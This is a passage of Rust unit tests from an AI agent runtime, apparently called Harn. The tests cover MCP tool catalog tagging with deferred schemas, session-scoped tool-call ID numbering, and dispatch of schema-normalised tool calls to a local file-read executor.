            next.contains("Do not retry the same call"),
            "true denial must still steer off a retry loop: {next}"
        );
    }
}

#[cfg(test)]
mod mcp_bootstrap_tests {
    use super::tag_mcp_tool;

    fn sample_tools() -> Vec<serde_json::Value> {
        vec![
            serde_json::json!({
                "name": "search_issues",
                "description": "Search issues by query",
                "inputSchema": {
                    "type": "object",
                    "properties": { "query": { "type": "string" } },
                    "required": ["query"],
                },
            }),
            serde_json::json!({
                "name": "create_issue",
                "description": "Create a new issue",
                "inputSchema": {
                    "type": "object",
                    "properties": { "title": { "type": "string" } },
                },
            }),
        ]
    }

    #[test]
    fn catalog_defers_schemas_by_default() {
        let tools: Vec<serde_json::Value> = sample_tools()
            .into_iter()
            .map(|tool| tag_mcp_tool(tool, "github", false))
            .collect();
        assert_eq!(tools.len(), 2);
        for tool in &tools {
            // Catalog surfaces name + one-line description...
            assert!(tool.get("name").and_then(|v| v.as_str()).is_some());
            assert!(tool.get("description").and_then(|v| v.as_str()).is_some());
            // ...and defers the full input schema until tool_search /
            // dispatch reaches for it.
            assert_eq!(
                tool.get("defer_loading").and_then(|v| v.as_bool()),
                Some(true),
                "MCP tools should defer their schema by default"
            );
        }
        // Names are server-namespaced so cross-server collisions can't
        // happen, and the MCP executor wiring is preserved so the tool
        // stays callable once its schema is loaded on demand.
        let first = &tools[0];
        assert_eq!(
            first.get("name").and_then(|v| v.as_str()),
            Some("github__search_issues")
        );
        assert_eq!(
            first.get("executor").and_then(|v| v.as_str()),
            Some("mcp_server")
        );
        assert_eq!(
            first.get("mcp_server").and_then(|v| v.as_str()),
            Some("github")
        );
        assert_eq!(
            first.get("_mcp_server").and_then(|v| v.as_str()),
            Some("github")
        );
        assert_eq!(
            first.get("_mcp_tool_name").and_then(|v| v.as_str()),
            Some("search_issues")
        );
        // The full schema is still carried on the descriptor (it is held
        // back at the provider/agent-loop layer, not discarded), so it
        // resolves on demand when the tool is surfaced or called.
        assert!(first
            .get("inputSchema")
            .and_then(|v| v.as_object())
            .is_some());
    }

    #[test]
    fn eager_opt_out_ships_schemas_upfront() {
        let tools: Vec<serde_json::Value> = sample_tools()
            .into_iter()
            .map(|tool| tag_mcp_tool(tool, "github", true))
            .collect();
        for tool in &tools {
            assert!(
                tool.get("defer_loading").is_none(),
                "eager_schemas: true must not defer MCP tool schemas"
            );
            assert!(tool
                .get("inputSchema")
                .and_then(|v| v.as_object())
                .is_some());
        }
    }

    #[test]
    fn server_advertised_defer_loading_is_preserved() {
        // A server that explicitly sets defer_loading: false keeps it,
        // even under the progressive-disclosure default.
        let tool = serde_json::json!({
            "name": "ping",
            "description": "Health check",
            "defer_loading": false,
        });
        let tagged = tag_mcp_tool(tool, "ops", false);
        assert_eq!(
            tagged.get("defer_loading").and_then(|v| v.as_bool()),
            Some(false)
        );
    }
}

#[cfg(test)]
mod parse_tool_call_id_tests {
    use super::host_agent_parse_tool_calls_impl;
    use crate::value::VmValue;

    fn vm_str(value: &str) -> VmValue {
        VmValue::String(arcstr::ArcStr::from(value))
    }

    fn look_tool_catalog() -> VmValue {
        crate::stdlib::json_to_vm_value(&serde_json::json!({
            "tools": [
                {
                    "name": "look",
                    "description": "Read a file",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "file": { "type": "string" },
                            "intent": { "type": "string" }
                        },
                        "required": ["file", "intent"]
                    }
                }
            ]
        }))
    }

    fn parse_ids(text: &str) -> Vec<String> {
        let value = futures::executor::block_on(host_agent_parse_tool_calls_impl(
            crate::vm::AsyncBuiltinCtx::for_test(crate::vm::Vm::new()),
            vec![vm_str(text), look_tool_catalog(), vm_str("text")],
        ))
        .expect("parse primitive succeeds");
        let json = crate::llm::helpers::vm_value_to_json(&value);
        json.get("calls")
            .and_then(|calls| calls.as_array())
            .expect("calls array")
            .iter()
            .map(|call| {
                call.get("id")
                    .and_then(|id| id.as_str())
                    .expect("call id")
                    .to_string()
            })
            .collect()
    }

    #[test]
    fn parse_tool_call_ids_are_session_scoped_across_turns() {
        crate::agent_sessions::reset_session_store();
        let session_a = crate::agent_sessions::open_or_create(Some("parse-id-a".to_string()));
        let session_b = crate::agent_sessions::open_or_create(Some("parse-id-b".to_string()));
        let text = "<tool_call>\nlook({ file: \"Cargo.toml\", intent: \"read\" })\n</tool_call>";

        {
            let _guard = crate::agent_sessions::enter_current_session(session_a.clone());
            assert_eq!(parse_ids(text), vec!["tc_0"]);
            assert_eq!(parse_ids(text), vec!["tc_1"]);
        }

        {
            let _guard = crate::agent_sessions::enter_current_session(session_b);
            assert_eq!(parse_ids(text), vec!["tc_0"]);
        }

        {
            let _guard = crate::agent_sessions::enter_current_session(session_a);
            assert_eq!(parse_ids(text), vec!["tc_2"]);
        }
    }

    #[test]
    fn parse_tool_call_ids_are_unique_within_one_turn() {
        crate::agent_sessions::reset_session_store();
        let session = crate::agent_sessions::open_or_create(Some("parse-id-batch".to_string()));
        let _guard = crate::agent_sessions::enter_current_session(session);
        let text = [
            "<tool_call>\nlook({ file: \"Cargo.toml\", intent: \"read\" })\n</tool_call>",
            "<tool_call>\nlook({ file: \"README.md\", intent: \"read\" })\n</tool_call>",
        ]
        .join("\n");

        assert_eq!(parse_ids(&text), vec!["tc_0", "tc_1"]);
    }

    #[test]
    fn parse_tool_call_ids_continue_after_seeded_transcript() {
        crate::agent_sessions::reset_session_store();
        let session = crate::agent_sessions::seed_from_messages(
            Some("parse-id-seeded".to_string()),
            &[
                serde_json::json!({
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {
                            "id": "tc_5",
                            "type": "function",
                            "function": {
                                "name": "look",
                                "arguments": "{\"file\":\"Cargo.toml\",\"intent\":\"read\"}"
                            }
                        }
                    ]
                }),
                serde_json::json!({
                    "role": "tool",
                    "tool_call_id": "tc_5",
                    "content": "{}"
                }),
            ],
            serde_json::json!({}),
            None,
            Some("text".to_string()),
        )
        .expect("seed session");
        let _guard = crate::agent_sessions::enter_current_session(session);
        let text = "<tool_call>\nlook({ file: \"README.md\", intent: \"read\" })\n</tool_call>";

        assert_eq!(parse_ids(text), vec!["tc_6"]);
    }
}

#[cfg(test)]
mod schema_argument_dispatch_tests {
    use super::host_agent_dispatch_tool_call;

    #[tokio::test]
    async fn dispatch_flattens_schema_declared_discriminator_envelope() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("dispatch-proof.txt");
        std::fs::write(&path, "schema dispatch proof\n").expect("write fixture");
        let tools = crate::stdlib::json_to_vm_value(&serde_json::json!({
            "tools": [{
                "name": "read_file",
                "description": "Read a file through the local Harn executor.",
                "parameters": {
                    "operation": {
                        "type": "string",
                        "enum": ["read"]
                    },
                    "path": {"type": "string"}
                }
            }]
        }));
        let call = crate::stdlib::json_to_vm_value(&serde_json::json!({
            "id": "schema-envelope-dispatch",
            "name": "read_file",
            "arguments": {
                "read": {"path": path}
            }
        }));

        let result = host_agent_dispatch_tool_call(
            crate::vm::AsyncBuiltinCtx::for_test(crate::vm::Vm::new()),
            call,
            Some(&tools),
            &crate::value::DictMap::new(),
        )
        .await
        .expect("dispatch succeeds");
        let result = crate::llm::helpers::vm_value_to_json(&result);

        assert_eq!(result["ok"], serde_json::json!(true));
        assert_eq!(
            result["executor"]["kind"],
            serde_json::json!("harn_builtin")
        );
        assert_eq!(result["arguments"]["operation"], serde_json::json!("read"));
        assert_eq!(result["arguments"]["path"], serde_json::json!(path));
        assert_eq!(
            result["rendered_result"],
            serde_json::json!("1\tschema dispatch proof"),
            "the normalized call must reach the real local executor"
        );
    }
}
